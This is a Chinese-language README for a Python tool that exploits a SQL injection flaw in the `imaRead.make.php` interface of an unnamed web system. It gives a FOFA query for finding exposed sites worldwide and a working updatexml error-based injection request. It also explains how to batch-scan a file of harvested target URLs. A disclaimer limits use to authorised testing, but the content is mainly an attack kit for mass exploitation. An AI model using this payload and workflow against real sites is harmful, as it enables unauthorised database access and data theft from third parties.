# SQL 注入自动化脚本
<p align="left">
  <img src="https://img.shields.io/badge/Stage-Exploit-red.svg" alt="Stage">
  <img src="https://img.shields.io/badge/Language-Python%203-blue.svg" alt="Language">
  <img src="https://img.shields.io/badge/Vuln-SQL%20Injection-orange.svg" alt="Vuln">
  <img src="https://img.shields.io/badge/Platform-Cross--Platform-lightgrey.svg" alt="Platform">
</p>

渗透项目 / 渗透工具 / 脚本文件

---

## 🔍 漏洞详情与原理
### 1. 漏洞概述
**系统的 `imaRead.make.php` 接口存在高危 SQL 注入漏洞。

### 2. 资产测绘 (FOFA)
可通过以下 FOFA 语句在全球资产中搜索受影响的目标网址：
    
    body="不要着急，点此"
   
### 3. 漏洞证明 (POC)
漏洞通过 POST 请求触发，参数 feeItem[] 未经过安全过滤，直接带入数据库执行。利用 updatexml 报错注入函数，可成功爆出对 12345678 进行 MD5 散列后的报错回显：

        HTTP
        POST /adminx/imaRead.make.php?act=remake HTTP/1.1

        feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)

### Quick Start
# 1. 克隆本项目仓库到本地
    git clone [https://github.com/JY-666-YINZI/Python_SQL_inj_test.git](https://github.com/JY-666-YINZI/Python_SQL_inj_test.git)

# 2. 切换进入到脚本所在的根目录下
    cd Python_SQL_inj_test

# 3. 安装脚本运行所必须的依赖库
    pip install requests

🚀 脚本运行指南
🚫 免责声明
⚠️ （##免责声明：仅用于科学上网绿色实验健康学习##）
本脚本仅用于法律授权的甲方自查、合规的白帽渗透测试及网络安全教学实验。严禁用于任何未授权的非法攻击行为。任何因非合规使用导致的法律后果，均由使用者本人承担！

🛠️ 环境与准备工作
!!! 本脚本是 python 环境下运行：

使用上面的 FOFA语句 搜索出网址。

可将网址统一带协议（如 http:// 或 https://）保存到文本文件中。

💻 命令行调用方法（⚠️核心注意事项）
💡 避坑提示（切记）：

运行脚本前，切记要切到这个根目录下，让终端显示出脚本文件的目录。

并且在使用 -f 读取文件时要注意路径：在文件名称前 + 路径/文件名。可以是相对路径，也可以是绝对路径，总之一定是能让系统识别到的路径才能读取到文件。

🔹 示例 1：检测单个目标 URL (-u)

    python3 Read.make.phpSQL注入.py -u yoururl
🔹 示例 2：批量读取文本进行扫描 (-f)

    python3 Read.make.phpSQL注入.py -f filename.txt
